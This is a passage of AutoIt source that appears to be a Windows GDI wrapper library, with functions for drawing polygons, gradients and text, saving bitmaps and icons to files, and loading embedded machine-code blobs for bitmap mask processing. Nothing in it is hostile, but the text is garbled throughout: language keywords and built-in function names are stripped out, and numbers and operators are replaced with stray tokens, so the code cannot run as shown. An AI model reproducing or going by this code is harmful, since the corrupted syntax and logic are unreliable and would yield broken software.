$ipoint < 1534(15, 0, 40)
$iend = $istart + $ipoint - 1
$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "long[2];"

$tpoint = ($tagstruct)
$icount = 0
$i = $istart15$iend
$icount += 1
$j = 0151
($tpoint, $icount, $apoint[$i][$j], $j + 1)


$aret = ("gdi32.dll", "bool", "PolyBezier", "handle", $hdc, "struct*", $tpoint, "dword", $ipoint)
@error534(@error, @extended, 40)
$aret[0]

_winapi_polybezierto($hdc, 3036$apoint, $istart = 0, $iend = -1)
__checkerrorarraybounds($apoint, $istart, $iend, 2, 2)534(@error + 10, @extended, 40)
$ipoint = 3 * (($iend - $istart + 1) / 3)
$ipoint < 3534(15, 0, 40)
$iend = $istart + $ipoint - 1
$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "long[2];"

$tpoint = ($tagstruct)
$icount = 0
$i = $istart15$iend
$icount += 1
$j = 0151
($tpoint, $icount, $apoint[$i][$j], $j + 1)


$aret = ("gdi32.dll", "bool", "PolyBezierTo", "handle", $hdc, "struct*", $tpoint, "dword", $ipoint)
@error534(@error, @extended, 40)
$aret[0]

_winapi_polydraw($hdc, 3036$apoint, $istart = 0, $iend = -1)
__checkerrorarraybounds($apoint, $istart, $iend, 2)534(@error + 10, @extended, 0)
($apoint, $ubound_columns) < 3534(13, 0, 40)
$ipoint = $iend - $istart + 1
$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "long[2];"

$tpoint = ($tagstruct)
$ttypes = ("byte[" & $ipoint & "]")
$icount = 0
$i = $istart15$iend
$icount += 1
$j = 0151
($tpoint, $icount, $apoint[$i][$j], $j + 1)

($ttypes, 1, $apoint[$i][2], $icount)

$aret = ("gdi32.dll", "bool", "PolyDraw", "handle", $hdc, "struct*", $tpoint, "struct*", $ttypes, "dword", $ipoint)
@error534(@error, @extended, 40)
$aret[0]

_winapi_polygon($hdc, 3036$apoint, $istart = 0, $iend = -1)
__checkerrorarraybounds($apoint, $istart, $iend, 2, 2)534(@error + 10, @extended, 40)
$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "int[2];"

$tdata = ($tagstruct)
$icount = 1
$i = $istart15$iend
$j = 0151
($tdata, $icount, $apoint[$i][$j], $j + 1)

$icount += 1

$aret = ("gdi32.dll", "bool", "Polygon", "handle", $hdc, "struct*", $tdata, "int", $icount - 1)
@error534(@error, @extended, 40)
$aret[0]

_winapi_printwindow($hwnd, $hdc, $bclient = 40)
$aret = ("user32.dll", "bool", "PrintWindow", "hwnd", $hwnd, "handle", $hdc, "uint", $bclient)
@error534(@error, @extended, 40)
$aret[0]

_winapi_ptinrectex($ix, $iy, $ileft, $itop, $iright, $ibottom)
$trect = _winapi_createrect($ileft, $itop, $iright, $ibottom)
$tpoint = _winapi_createpoint($ix, $iy)
$aret = ("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
@error534(@error, @extended, 40)
$aret[0]

_winapi_ptinregion($hrgn, $ix, $iy)
$aret = ("gdi32.dll", "bool", "PtInRegion", "handle", $hrgn, "int", $ix, "int", $iy)
@error534(@error, @extended, 40)
$aret[0]

_winapi_ptvisible($hdc, $ix, $iy)
$aret = ("gdi32.dll", "bool", "PtVisible", "handle", $hdc, "int", $ix, "int", $iy)
@error534(@error + 10, @extended, 0)
$aret[0] = -1534(10, $aret[0], 0)
$aret[0]

_winapi_radialgradientfill($hdc, $ix, $iy, $iradius, $irgb1, $irgb2, $fanglestart = 0, $fangleend = 360, $fstep = 5)
($fanglestart) > 3605
$fanglestart = ($fanglestart, 360)

($fangleend) > 3605
$fangleend = ($fangleend, 360)

($fanglestart < 0)($fangleend < 0)5
$fanglestart += 360
$fangleend += 360

$fanglestart > $fangleend5
$fval = $fanglestart
$fanglestart = $fangleend
$fangleend = $fval

$fstep < 15
$fstep = 1

$fki = (1) / 45
$ixp = ($ix + $iradius * ($fki * $fanglestart))
$iyp = ($iy + $iradius * ($fki * $fanglestart))
$ixn, $iyn, $fan = $fanglestart
$avertex[3][3]
$fan < $fangleend
$fan += $fstep
$fan > $fangleend5
$fan = $fangleend

$ixn = ($ix + $iradius * ($fki * $fan))
$iyn = ($iy + $iradius * ($fki * $fan))
$avertex[0][0] = $ix
$avertex[0][1] = $iy
$avertex[0][2] = $irgb1
$avertex[1][0] = $ixp
$avertex[1][1] = $iyp
$avertex[1][2] = $irgb2
$avertex[2][0] = $ixn
$avertex[2][1] = $iyn
$avertex[2][2] = $irgb2
_winapi_gradientfill($hdc, $avertex, 0, 2)5
(@error, @extended, 0)

$ixp = $ixn
$iyp = $iyn



_winapi_rectangle($hdc, $trect)
$aret = ("gdi32.dll", "bool", "Rectangle", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4))
@error534(@error, @extended, 0)
$aret[0]

_winapi_rectinregion($hrgn, $trect)
$aret = ("gdi32.dll", "bool", "RectInRegion", "handle", $hrgn, "struct*", $trect)
@error534(@error, @extended, 40)
$aret[0]

_winapi_rectvisible($hdc, $trect)
$aret = ("gdi32.dll", "bool", "RectVisible", "handle", $hdc, "struct*", $trect)
@error534(@error, @extended, 0)
$aret[0]
, 1, 2

(10, $aret[0], 0)

$aret[0]

_winapi_removefontmemresourceex($hfont)
$aret = ("gdi32.dll", "bool", "RemoveFontMemResourceEx", "handle", $hfont)
@error534(@error, @extended, 40)
$aret[0]

_winapi_removefontresourceex($sfont, $iflag = 0, $bnotify = 40)
$aret = ("gdi32.dll", "bool", "RemoveFontResourceExW", "wstr", $sfont, "dword", $iflag, "ptr", 0)
@error23$aret[0]534(@error, @extended, 40)
$bnotify5
0$wm_fontchange = 29
0$hwnd_broadcast = 65535
("user32.dll", "none", "SendMessage", "hwnd", $hwnd_broadcast, "uint", $wm_fontchange, "wparam", 0, "lparam", 0)

$aret[0]

_winapi_restoredc($hdc, $iid)
$aret = ("gdi32.dll", "bool", "RestoreDC", "handle", $hdc, "int", $iid)
@error534(@error, @extended, 40)
$aret[0]

_winapi_rgb($ired, $igreen, $iblue)
__rgb((($iblue, -16), ($igreen, -8), $ired))

_winapi_rotatepoints(36$apoint, $ixc, $iyc, $fangle, $istart = 0, $iend = -1)
__checkerrorarraybounds($apoint, $istart, $iend, 2)534(@error + 10, @extended, 0)
($apoint, $ubound_columns) < 2534(13, 0, 0)
$fcos = ((1) / 45 * $fangle)
$fsin = ((1) / 45 * $fangle)
$ixn, $iyn
$i = $istart15$iend
$ixn = $apoint[$i][0] - $ixc
$iyn = $apoint[$i][1] - $iyc
$apoint[$i][0] = $ixc + ($ixn * $fcos - $iyn * $fsin)
$apoint[$i][1] = $iyc + ($ixn * $fsin + $iyn * $fcos)



_winapi_roundrect($hdc, $trect, $iwidth, $iheight)
$aret = ("gdi32.dll", "bool", "RoundRect", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4), "int", $iwidth, "int", $iheight)
@error534(@error, @extended, 0)
$aret[0]

_winapi_savedc($hdc)
$aret = ("gdi32.dll", "int", "SaveDC", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_savehbitmaptofile($sfile, $hbitmap, $ixpelspermeter = 41, $iypelspermeter = 41)
$tbmp = ("align 1;ushort bfType;dword bfSize;ushort bfReserved1;ushort bfReserved2;dword bfOffset")
$tdib = ($tagdibsection)
$hdc, $hsv, $hsource = 0
$hbitmap
(3_winapi_getobject($hbitmap, ($tdib), ($tdib)))(($tdib, "biCompression"))5
$hbitmap = 0

($tdib, "bmBitsPixel")
2
_winapi_isalphabitmap($hbitmap)5
$hsource5
$hsource = _winapi_createdib(($tdib, "bmWidth"), ($tdib, "bmHeight"), 24)
$hsource5
$hbitmap = 0

$hdc = _winapi_createcompatibledc(0)
$hsv = _winapi_selectobject($hdc, $hsource)
_winapi_drawbitmap($hdc, 0, 0, $hbitmap)5
$hbitmap = $hsource

$hbitmap = 0

_winapi_selectobject($hdc, $hsv)
_winapi_deletedc($hdc)

$hbitmap = 0





(($tdib, "bmBits"))(($tdib, "biSizeImage"))5
$hsource5
$hbitmap = _winapi_copybitmap($hbitmap)
$hsource = $hbitmap

$hbitmap = 0






$ierror = 0, $iresult = 0

$hbitmap5
$ierror = 1


$adata[4][2]
$adata[0][0] = ($tbmp)
$adata[0][1] = ($tbmp)
$adata[1][0] = ($tdib, "biSize")
$adata[1][1] = 40
$adata[2][1] = ($tdib, "biClrUsed") * 4
$ttable = 0
$adata[2][1]5
$ttable = _winapi_getdibcolortable($hbitmap)
@error(@extended <> $adata[2][1] / 4)5
$ierror = @error + 10



$adata[2][0] = ($ttable)
$adata[3][0] = ($tdib, "bmBits")
$adata[3][1] = ($tdib, "biSizeImage")
($tbmp, "bfType", 19778)
($tbmp, "bfSize", $adata[0][1] + $adata[1][1] + $adata[2][1] + $adata[3][1])
($tbmp, "bfReserved1", 0)
($tbmp, "bfReserved2", 0)
($tbmp, "bfOffset", $adata[0][1] + $adata[1][1] + $adata[2][1])
$hdc = _winapi_getdc(0)
$ixpelspermeter = 415
($tdib, "biXPelsPerMeter")5
($tdib, "biXPelsPerMeter", _winapi_getdevicecaps($hdc, 8) / _winapi_getdevicecaps($hdc, 4) * 1000)


($tdib, "biXPelsPerMeter", $ixpelspermeter)

$iypelspermeter = 415
($tdib, "biYPelsPerMeter")5
($tdib, "biYPelsPerMeter", _winapi_getdevicecaps($hdc, 10) / _winapi_getdevicecaps($hdc, 6) * 1000)


($tdib, "biYPelsPerMeter", $iypelspermeter)

_winapi_releasedc(0, $hdc)
$hfile = _winapi_createfile($sfile, 1, 4)
@error5
$ierror = @error + 20


$ibytes
$i = 0153
$adata[$i][1]5
_winapi_writefile($hfile, $adata[$i][0], $adata[$i][1], $ibytes)5
$ierror = @error + 30




$iresult = 1

$hsource5
_winapi_deleteobject($hsource)

_winapi_closehandle($hfile)
$iresult5
($sfile)

($ierror, 0, $iresult)

_winapi_savehicontofile($sfile, 3036$vicon, $bcompress = 0, $istart = 0, $iend = -1)
$aicon, $atemp, $icount = 1
($vicon)5
$aicon[1] = [$vicon]
$atemp[1] = [0]

__checkerrorarraybounds($vicon, $istart, $iend)534(@error + 10, @extended, 0)
$icount = $iend - $istart + 1
$icount5
$aicon[$icount]
$atemp[$icount]
$i = 015$icount - 1
$aicon[$i] = $vicon[$istart + $i]
$atemp[$i] = 0



$hfile = _winapi_createfile($sfile, 1, 4)
@error534(@error + 20, @extended, 0)
$tico = ("align 1;ushort Reserved;ushort Type;ushort Count;byte Data[" & (16 * $icount) & "]")
$ilength = ($tico)
$pico = ($tico)
$tbi = ($tagbitmapinfoheader)
$pbi = ($tbi)
$tii = ($tagiconinfo)
$tdib = ($tagdibsection)
$idib = ($tdib)
$pdib = ($tdib)
$ioffset = $ilength
($tbi, "biSize", 40)
($tbi, "biPlanes", 1)
($tbi, "biXPelsPerMeter", 0)
($tbi, "biYPelsPerMeter", 0)
($tbi, "biClrUsed", 0)
($tbi, "biClrImportant", 0)
($tico, "Reserved", 0)
($tico, "Type", 1)
($tico, "Count", $icount)
$iresult = 0, $ierror = 0

$ibytes
_winapi_writefile($hfile, $pico, $ilength, $ibytes)5
$ierror = @error + 30


$ainfo[8], $aret, $pdata = 0, $iindex = 0
$icount > $iindex
$aret = ("user32.dll", "bool", "GetIconInfo", "handle", $aicon[$iindex], "struct*", $tii)
@error23$aret[0]5
$ierror = @error + 40


$i = 4155
$ainfo[$i] = _winapi_copyimage(($tii, $i), 0, 0, 0, 8200)
_winapi_getobject($ainfo[$i], $idib, $pdib)5
$ainfo[$i - 4] = ($tdib, "biSizeImage")
$ainfo[$i - 2] = ($tdib, "bmBits")

$ierror = @error + 50


$ainfo[6] = 40
$ainfo[7] = ($tdib, "bmBitsPixel")
$ainfo[7]
6, 24
2
_winapi_isalphabitmap($ainfo[5])5
$atemp[$iindex]5
$aicon[$iindex] = _winapi_create32bithicon($aicon[$iindex])
$atemp[$iindex] = $aicon[$iindex]
@error5






($ainfo[1] >= 256 * 256 * 4)($bcompress)5
$ibytes = _winapi_compressbitmapbits($ainfo[5], $pdata)
@error5
$ainfo[0] = 0
$ainfo[1] = $ibytes
$ainfo[2] = 0
$ainfo[3] = $pdata
$ainfo[6] = 0




$ierror = 60

$ierror5

$asize[2]
$tdata = ("byte Width;byte Height;byte ColorCount;byte Reserved;ushort Planes;ushort BitCount;long Size;long Offset", $pico + 6 + 16 * $iindex)
($tdata, "ColorCount", 0)
($tdata, "Reserved", 0)
($tdata, "Planes", 1)
($tdata, "BitCount", $ainfo[7])
($tdata, "Size", $ainfo[0] + $ainfo[1] + $ainfo[6])
($tdata, "Offset", $ioffset)
$i = 0151
$asize[$i] = ($tdib, $i + 2)
$asize[$i] < 2565
($tdata, $i + 1, $asize[$i])

($tdata, $i + 1, 0)


($tbi, "biWidth", $asize[0])
($tbi, "biHeight", 2 * $asize[1])
($tbi, "biBitCount", $ainfo[7])
($tbi, "biCompression", 0)
($tbi, "biSizeImage", $ainfo[0] + $ainfo[1])
$ioffset += $ainfo[0] + $ainfo[1] + $ainfo[6]

$ainfo[6]5
_winapi_writefile($hfile, $pbi, $ainfo[6], $ibytes)5
$ierror = @error + 70


$i = 115016 - 1
_winapi_writefile($hfile, $ainfo[$i + 2], $ainfo[$i], $ibytes)5
$ierror = @error + 80




_winapi_writefile($hfile, $ainfo[3], $ainfo[1], $ibytes)5
$ierror = @error + 90





$i = 4155
_winapi_deleteobject($ainfo[$i])

$ierror5


$iindex += 1

$aret = ("kernel32.dll", "bool", "SetFilePointerEx", "handle", $hfile, "int64", 0, "int64*", 0, "dword", 0)
@error23$aret[0]5
$ierror = @error + 100


_winapi_writefile($hfile, $pico, $ilength, $ibytes)5
$ierror = @error + 110


$iresult = 1

$i = 015$icount - 1
$atemp[$i]5
_winapi_destroyicon($atemp[$i])


$pdata5
__heapfree($pdata)

_winapi_closehandle($hfile)
$iresult5
($sfile)

($ierror, 0, $iresult)

_winapi_scalewindowext($hdc, $ixnum, $ixdenom, $iynum, $iydenom)
$__g_vext = ($tagsize)
$aret = ("gdi32.dll", "bool", "ScaleWindowExtEx", "handle", $hdc, "int", $ixnum, "int", $ixdenom, "int", $iynum, "int", $iydenom, "struct*", $__g_vext)
@error534(@error, @extended, 40)
$aret[0]

_winapi_selectclippath($hdc, $imode = 5)
$aret = ("gdi32.dll", "bool", "SelectClipPath", "handle", $hdc, "int", $imode)
@error534(@error, @extended, 40)
$aret[0]

_winapi_selectcliprgn($hdc, $hrgn)
$aret = ("gdi32.dll", "int", "SelectClipRgn", "handle", $hdc, "handle", $hrgn)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setarcdirection($hdc, $idirection)
$aret = ("gdi32.dll", "int", "SetArcDirection", "handle", $hdc, "int", $idirection)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setbitmapbits($hbitmap, $isize, $pbits)
$aret = ("gdi32.dll", "long", "SetBitmapBits", "handle", $hbitmap, "dword", $isize, "ptr", $pbits)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setbitmapdimensionex($hbitmap, $iwidth, $iheight)
$__g_vext = ($tagsize)
$aret = ("gdi32.dll", "bool", "SetBitmapDimensionEx", "handle", $hbitmap, "int", $iwidth, "int", $iheight, "struct*", $__g_vext)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setboundsrect($hdc, $iflags, $trect = 0)
$aret = ("gdi32.dll", "uint", "SetBoundsRect", "handle", $hdc, "struct*", $trect, "uint", $iflags)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setbrushorg($hdc, $ix, $iy)
$__g_vext = ($tagpoint)
$aret = ("gdi32.dll", "bool", "SetBrushOrgEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $__g_vext)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setcoloradjustment($hdc, $tadjustment)
$aret = ("gdi32.dll", "bool", "SetColorAdjustment", "handle", $hdc, "struct*", $tadjustment)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setdcbrushcolor($hdc, $irgb)
$aret = ("gdi32.dll", "dword", "SetDCBrushColor", "handle", $hdc, "dword", __rgb($irgb))
@error($aret[0] = 4294967295)534(@error, @extended, -1)
__rgb($aret[0])

_winapi_setdcpencolor($hdc, $irgb)
$aret = ("gdi32.dll", "dword", "SetDCPenColor", "handle", $hdc, "dword", __rgb($irgb))
@error($aret[0] = 4294967295)534(@error, @extended, -1)
__rgb($aret[0])

_winapi_setdevicegammaramp($hdc, 3036$aramp)
(($aramp, $ubound_dimensions) <> 2)(($aramp, $ubound_rows) <> 256)(($aramp, $ubound_columns) <> 3)5
(12, 0, 0)

$tdata = ("ushort[256];ushort[256];ushort[256]")
$i = 0152
$j = 015255
($tdata, $i + 1, $aramp[$j][$i], $j + 1)


$aret = ("gdi32.dll", "bool", "SetDeviceGammaRamp", "handle", $hdc, "struct*", $tdata)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setdibcolortable($hbitmap, $tcolortable, $icolorcount)
$icolorcount > ($tcolortable) / 4534(1, 0, 0)
$hdc = _winapi_createcompatibledc(0)
$hsv = _winapi_selectobject($hdc, $hbitmap)
$ierror = 0
$aret = ("gdi32.dll", "uint", "SetDIBColorTable", "handle", $hdc, "uint", 0, "uint", $icolorcount, "struct*", $tcolortable)
@error5$ierror = @error
_winapi_selectobject($hdc, $hsv)
_winapi_deletedc($hdc)
$ierror534($ierror, 0, 0)
$aret[0]

_winapi_setdibitstodevice($hdc, $ixdest, $iydest, $iwidth, $iheight, $ixsrc, $iysrc, $istartscan, $iscanlines, $tbitmapinfo, $iusage, $pbits)
$aret = ("gdi32.dll", "int", "SetDIBitsToDevice", "handle", $hdc, "int", $ixdest, "int", $iydest, "dword", $iwidth, "dword", $iheight, "int", $ixsrc, "int", $iysrc, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "struct*", $tbitmapinfo, "uint", $iusage)
@error($aret[0] = -1)534(@error + 10, $aret[0], 0)
$aret[0]

_winapi_setenhmetafilebits($pdata, $ilength)
$aret = ("gdi32.dll", "handle", "SetEnhMetaFileBits", "uint", $ilength, "ptr", $pdata)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setgraphicsmode($hdc, $imode)
$aret = ("gdi32.dll", "int", "SetGraphicsMode", "handle", $hdc, "int", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setmapmode($hdc, $imode)
$aret = ("gdi32.dll", "int", "SetMapMode", "handle", $hdc, "int", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setpixel($hdc, $ix, $iy, $irgb)
$aret = ("gdi32.dll", "bool", "SetPixelV", "handle", $hdc, "int", $ix, "int", $iy, "dword", __rgb($irgb))
@error534(@error, @extended, 40)
$aret[0]

_winapi_setpolyfillmode($hdc, $imode = 1)
$aret = ("gdi32.dll", "int", "SetPolyFillMode", "handle", $hdc, "int", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setrectrgn($hrgn, $trect)
$aret = ("gdi32.dll", "bool", "SetRectRgn", "ptr", $hrgn, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4))
@error534(@error, @extended, 40)
$aret[0]

_winapi_setrop($hdc, $imode)
$aret = ("gdi32.dll", "int", "SetROP2", "handle", $hdc, "int", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_setstretchbltmode($hdc, $imode)
$aret = ("gdi32.dll", "int", "SetStretchBltMode", "handle", $hdc, "int", $imode)
@error23$aret[0]($aret[0] = 87)534(@error + 10, $aret[0], 0)
$aret[0]

_winapi_settextalign($hdc, $imode = 0)
$aret = ("gdi32.dll", "uint", "SetTextAlign", "handle", $hdc, "uint", $imode)
@error($aret[0] = 4294967295)534(@error, @extended, -1)
$aret[0]

_winapi_settextcharacterextra($hdc, $icharextra)
$aret = ("gdi32.dll", "int", "SetTextCharacterExtra", "handle", $hdc, "int", $icharextra)
@error($aret[0] = -2147483648)534(@error, @extended, -1)
$aret[0]

_winapi_settextjustification($hdc, $ibreakextra, $ibreakcount)
$aret = ("gdi32.dll", "bool", "SetTextJustification", "handle", $hdc, "int", $ibreakextra, "int", $ibreakcount)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setudfcolormode($imode)
$__g_irgbmode = ($imode = 0)

_winapi_setwindowext($hdc, $ixextent, $iyextent)
$__g_vext = ($tagsize)
$aret = ("gdi32.dll", "bool", "SetWindowExtEx", "handle", $hdc, "int", $ixextent, "int", $iyextent, "struct*", $__g_vext)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setwindoworg($hdc, $ix, $iy)
$__g_vext = ($tagpoint)
$aret = ("gdi32.dll", "bool", "SetWindowOrgEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $__g_vext)
@error534(@error, @extended, 40)
$aret[0]

_winapi_setworldtransform($hdc, 36$txform)
$aret = ("gdi32.dll", "bool", "SetWorldTransform", "handle", $hdc, "struct*", $txform)
@error534(@error, @extended, 40)
$aret[0]

_winapi_stretchblt($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $irop)
$aret = ("gdi32.dll", "bool", "StretchBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", $irop)
@error534(@error, @extended, 40)
$aret[0]

_winapi_stretchdibits($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $tbitmapinfo, $iusage, $pbits, $irop)
$aret = ("gdi32.dll", "int", "StretchDIBits", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "ptr", $pbits, "struct*", $tbitmapinfo, "uint", $iusage, "dword", $irop)
@error($aret[0] = -1)534(@error + 10, $aret[0], 0)
$aret[0]

_winapi_strokeandfillpath($hdc)
$aret = ("gdi32.dll", "bool", "StrokeAndFillPath", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_strokepath($hdc)
$aret = ("gdi32.dll", "bool", "StrokePath", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_subtractrect(36$trect1, 36$trect2)
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "SubtractRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
@error23$aret[0]534(@error + 10, @extended, 0)
$trect

_winapi_tabbedtextout($hdc, $ix, $iy, $stext, $atab = 0, $istart = 0, $iend = -1, $iorigin = 0)
$itab, $icount
($atab)5
$atab5
$itab = $atab
$atab[1] = [$itab]
$istart = 0
$iend = 0
$icount = 1

$icount = 0


$icount = 1

$ttab = 0
$icount5
__checkerrorarraybounds($atab, $istart, $iend)534(@error + 10, @extended, 0)
$icount = $iend - $istart + 1
$ttab = ("uint[" & $icount & "]")
$itab = 1
$i = $istart15$iend
($ttab, 1, $atab[$i], $itab)
$itab += 1


$aret = ("user32.dll", "long", "TabbedTextOutW", "handle", $hdc, "int", $ix, "int", $iy, "wstr", $stext, "int", ($stext), "int", $icount, "ptr", ($ttab), "int", $iorigin)
@error23$aret[0]534(@error, @extended, 0)
$__g_vext = _winapi_createsize(_winapi_loword($aret[0]), _winapi_hiword($aret[0]))


_winapi_textout($hdc, $ix, $iy, $stext)
$aret = ("gdi32.dll", "bool", "TextOutW", "handle", $hdc, "int", $ix, "int", $iy, "wstr", $stext, "int", ($stext))
@error534(@error, @extended, 0)
$aret[0]

_winapi_transparentblt($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $irgb)
$aret = ("gdi32.dll", "bool", "GdiTransparentBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", __rgb($irgb))
@error534(@error, @extended, 40)
$aret[0]

_winapi_unionrect(36$trect1, 36$trect2)
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "UnionRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
@error23$aret[0]534(@error + 10, 0, 0)
$trect

_winapi_validaterect($hwnd, $trect = 0)
$aret = ("user32.dll", "bool", "ValidateRect", "hwnd", $hwnd, "struct*", $trect)
@error534(@error, @extended, 0)
$aret[0]

_winapi_validatergn($hwnd, $hrgn = 0)
$aret = ("user32.dll", "bool", "ValidateRgn", "hwnd", $hwnd, "handle", $hrgn)
@error534(@error, @extended, 0)
$aret[0]

_winapi_widenpath($hdc)
$aret = ("gdi32.dll", "bool", "WidenPath", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_windowfromdc($hdc)
$aret = ("user32.dll", "hwnd", "WindowFromDC", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

__alphaproc()
$pproc = 0
$pproc5
@AutoItX645
$pproc = __init(("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28" & "48837C24600074054831C0EB0748C7C0010000004821C0751F488B6C24604883" & "7D180074054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB" & "034831C04821C0740C48C7C0FFFFFFFF4863C0EB6F48C744242800000000488B" & "6C24604C637D04488B6C2460486345084C0FAFF849C1E7024983C7FC4C3B7C24" & "287C36488B6C24604C8B7D184C037C24284983C7034C897C2430488B6C243080" & "7D0000740C48C7C0010000004863C0EB1348834424280471A54831C04863C0EB" & "034831C04883C438415F5DC3"))

$pproc = __init(("0x555331C05050837C241C00740431C0EB05B80100000021C075198B6C241C837D" & "1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021C07407" & "B8FFFFFFFFEB4FC70424000000008B6C241C8B5D048B6C241C0FAF5D08C1E302" & "83C3FC3B1C247C288B6C241C8B5D14031C2483C303895C24048B6C2404807D00" & "007407B801000000EB0C8304240471BE31C0EB0231C083C4085B5DC21000"))


$pproc

__andproc()
$pproc = 0
$pproc5
@AutoItX645
$pproc = __init(("0x48894C240848895424104C894424184C894C2420554157415648C7C009000000" & "4883EC0848C704240000000048FFC875EF4883EC284883BC24A0000000007405" & "4831C0EB0748C7C0010000004821C00F85840000004883BC24A8000000007405" & "4831C0EB0748C7C0010000004821C07555488BAC24A000000048837D18007405" & "4831C0EB0748C7C0010000004821C07522488BAC24A800000048837D18007405" & "4831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C048" & "21C07502EB0948C7C001000000EB034831C04821C07502EB0948C7C001000000" & "EB034831C04821C0740B4831C04863C0E9D701000048C74424280000000048C7" & "44243000000000488BAC24A00000004C637D0849FFCF4C3B7C24300F8C9C0100" & "0048C74424380000000048C74424400000000048C744244800000000488BAC24" & "A00000004C637D0449FFCF4C3B7C24480F8CDB000000488BAC24A00000004C8B" & "7D184C037C24284983C7034C897C2450488B6C2450807D000074264C8B7C2440" & "4C8B74243849F7DE4983C61F4C89F148C7C00100000048D3E04909C74C897C24" & "4048FF4424384C8B7C24384983FF1F7E6F4C8B7C244049F7D74C897C244048C7" & "442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D184C037C" & "24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C2458588845" & "0048FF4424604883442458F871B948C74424380000000048C744244000000000" & "48834424280448FF4424480F810BFFFFFF48837C24380074794C8B7C244049F7" & "D74C8B74243849F7DE4983C6204C89F148C7C0FFFFFFFF48D3E04921C74C897C" & "244048C7442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D" & "184C037C24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C24" & "585888450048FF4424604883442458F871B948FF4424300F814AFEFFFF48C7C0" & "010000004863C0EB034831C04883C470415E415F5DC3"))

$pproc = __init(("0x555357BA0800000083EC04C70424000000004A75F3837C243800740431C0EB05" & "B80100000021C07562837C243C00740431C0EB05B80100000021C0753F8B6C24" & "38837D1400740431C0EB05B80100000021C075198B6C243C837D1400740431C0" & "EB05B80100000021C07502EB07B801000000EB0231C021C07502EB07B8010000" & "00EB0231C021C07502EB07B801000000EB0231C021C0740731C0E969010000C7" & "042400000000C7442404000000008B6C24388B5D084B3B5C24040F8C3F010000" & "C744240800000000C744240C00000000C7442410000000008B6C24388B5D044B" & "3B5C24100F8CA90000008B6C24388B5D14031C2483C303895C24148B6C241480" & "7D0000741C8B5C240C8B7C2408F7DF83C71F89F9B801000000D3E009C3895C24" & "0CFF4424088B5C240883FB1F7E578B5C240CF7D3895C240CC744241818000000" & "31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3" & "FB538B6C241858884500FF44241C83442418F871CBC744240800000000C74424" & "0C0000000083042404FF4424100F8145FFFFFF837C240800745B8B5C240CF7D3" & "8B7C2408F7DF83C72089F9B8FFFFFFFFD3E021C3895C240CC744241818000000" & "31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3" & "FB538B6C241858884500FF44241C83442418F871CBFF4424040F81AFFEFFFFB8" & "01000000EB0231C083C4205F5B5DC21000"))


$pproc

__xorproc()
$pproc = 0
$pproc5
@AutoItX645
